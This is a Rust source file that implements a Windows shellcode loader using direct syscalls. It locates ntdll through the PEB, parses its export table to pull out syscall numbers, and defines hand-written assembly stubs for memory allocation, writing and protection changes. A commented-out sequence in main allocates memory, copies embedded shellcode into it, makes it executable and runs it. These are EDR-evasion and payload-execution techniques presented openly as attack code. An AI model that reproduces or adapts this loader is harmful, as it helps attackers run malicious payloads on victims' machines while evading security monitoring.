#![allow(non_upper_case_globals)]

use std::{
    arch::global_asm,
    ffi::{CStr, c_void},
    ptr::null_mut,
};

use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
use windows_sys::Win32::System::{
    Diagnostics::Debug::IMAGE_NT_HEADERS64,
    SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

pub const NtCurrentProcess: *mut c_void = -1isize as *mut c_void;
pub const MEM_COMMIT: u32 = 4096u32;
pub const MEM_RESERVE: u32 = 8192u32;
pub const PAGE_READWRITE: u32 = 4u32;
pub const PAGE_EXECUTE_READ: u32 = 32u32;

unsafe extern "win64" {
    fn Sys_NtAllocateVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        ZeroBits: usize,
        RegionSize: *mut usize,
        AllocationType: u32,
        Protect: u32,
    ) -> i32;
    fn Sys_NtWriteVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut c_void,
        Buffer: *mut c_void,
        BufferSize: usize,
        NumberOfBytesWritten: *mut usize,
    ) -> i32;
    fn Sys_NtProtectVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        RegionSize: *mut usize,
        NewProtect: u32,
        OldProtect: *mut u32,
    ) -> i32;
}

global_asm!(
    "
    .data
    SSN: .word 0

    .section .text
    .code64

    Sys_NtAllocateVirtualMemory:
        mov r10, rcx
        mov rax, 0x18
        syscall
        ret
    
    Sys_NtWriteVirtualMemory:
        mov r10, rcx
        mov rax, 0x3A
        syscall
        ret

    Sys_NtProtectVirtualMemory:
        mov r10, rcx
        mov rax, 0x50
        syscall
        ret
    "
);

type ShellcodeFn = unsafe extern "C" fn() -> ();

fn get_current_teb() -> PTEB {
    let mut teb: PTEB = null_mut();
    unsafe {
        #[cfg(target_arch = "x86_64")]
        std::arch::asm!(
            "mov {}, gs:[0x30]",
            out(reg) teb
        );
        #[cfg(target_arch = "x86")]
        std::arch::asm!(
            "mov {}, fs:[0x18]",
            out(reg) teb
        );
        teb
    }
}

fn get_export_directory(
    ntdll_base: *mut c_void,
    export_directory: &mut *mut IMAGE_EXPORT_DIRECTORY,
) -> bool {
    unsafe {
        let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS header");
            return false;
        }

        let nt_headers =
            ntdll_base.add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT header");
            return false;
        }

        *export_directory = ntdll_base
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *mut IMAGE_EXPORT_DIRECTORY;

        if export_directory.is_null() {
            println!("[-] Invalid export directory");
            return false;
        }

        return true;
    }
}

fn get_ssn(func_name: &str) -> u32 {
    unsafe {
        let teb = get_current_teb();
        let peb = teb.read().ProcessEnvironmentBlock;

        if teb.is_null() || peb.is_null() || peb.read().OSMajorVersion != 10 {
            println!("[-] Invalid PEB");
            return 0;
        }

        let ldr_data_entry = (peb
            .read()
            .Ldr
            .read()
            .InMemoryOrderModuleList
            .Flink
            .read()
            .Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;

        let ntdll_base = ldr_data_entry.read().DllBase as *mut c_void;
        println!("[+] ntdll.dll base address: {:p}", ntdll_base);

        let mut export_directory: *mut IMAGE_EXPORT_DIRECTORY = null_mut();
        if !get_export_directory(ntdll_base, &mut export_directory) {
            println!("[-] Failed to get export directory");
            return 0;
        }

        let address_of_functions =
            ntdll_base.add((*export_directory).AddressOfFunctions as usize) as *const u32;
        let address_of_names =
            ntdll_base.add((*export_directory).AddressOfNames as usize) as *const u32;
        let address_of_name_ordinals =
            ntdll_base.add((*export_directory).AddressOfNameOrdinals as usize) as *const u16;

        for i in 0..(*export_directory).NumberOfNames as isize {
            let function_name =
                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;

            let ordinal = *address_of_name_ordinals.offset(i) as usize;

            if ordinal >= (*export_directory).NumberOfFunctions as usize {
                continue;
            }

            let function_rva = *address_of_functions.offset(ordinal as isize);
            let function_addr = ntdll_base.add(function_rva as usize);

            let c_str = CStr::from_ptr(function_name);

            if let Ok(function_str) = c_str.to_str() {
                if func_name.eq_ignore_ascii_case(function_str) {
                    println!(
                        "[+] Found function: {} at {:p}",
                        function_str, function_addr
                    );

                    let mut byte = 0;
                    loop {
                        let bytes = function_addr as *const u8;
                        if *bytes.offset(byte) == 0x0f && *bytes.offset(byte + 1) == 0x05 {
                            return 0;
                        }

                        if *bytes.offset(byte) == 0xc3 {
                            return 0;
                        }

                        if *bytes.offset(byte) == 0x4c
                            && *bytes.offset(byte + 1) == 0x8b
                            && *bytes.offset(byte + 2) == 0xd1
                            && *bytes.offset(byte + 3) == 0xb8
                            && *bytes.offset(byte + 6) == 0x00
                            && *bytes.offset(byte + 7) == 0x00
                        {
                            let low = *bytes.offset(byte + 4) as u32;
                            let high = *bytes.offset(byte + 5) as u32;
                            let ssn = (high << 8) | low;

                            return ssn;
                        }

                        byte += 1;
                    }
                }
            }
        }
    }
    0
}

fn main() {
    unsafe {
        let ssn = get_ssn("NtAllocateVirtualMemory");
        println!("[+] NtAllocateVirtualMemory SSN: 0x{:X}", ssn);

        // let mut base_address: *mut _ = null_mut();
        // let mut size = SHELLCODE.len();
        // let status = Sys_NtAllocateVirtualMemory(
        //     NtCurrentProcess,
        //     &mut base_address,
        //     0,
        //     &mut size,
        //     MEM_COMMIT | MEM_RESERVE,
        //     PAGE_READWRITE,
        // );

        // if status != 0 {
        //     println!("[-] Failed to allocate memory: 0x{:X}", status);
        //     return;
        // }

        // println!("[+] Allocated {} bytes at {:p}", size, base_address);

        // let mut bytes_written = 0;
        // let status = Sys_NtWriteVirtualMemory(
        //     NtCurrentProcess,
        //     base_address,
        //     SHELLCODE.as_ptr() as *mut c_void,
        //     SHELLCODE.len(),
        //     &mut bytes_written,
        // );

        // if status != 0 {
        //     println!("[-] Failed to write shellcode: 0x{:X}", status);
        //     return;
        // }

        // println!("[+] Wrote {} bytes of shellcode", bytes_written);

        // let mut old_protect: u32 = 0;
        // let status = Sys_NtProtectVirtualMemory(
        //     NtCurrentProcess,
        //     &mut base_address,
        //     &mut size,
        //     PAGE_EXECUTE_READ,
        //     &mut old_protect,
        // );

        // if status != 0 {
        //     println!("[-] Failed to change memory protection: 0x{:X}", status);
        //     return;
        // }

        // let shellcode_fn: ShellcodeFn = std::mem::transmute(base_address);
        // println!("[+] Executing shellcode...");
        // shellcode_fn();

        return;
    }
}
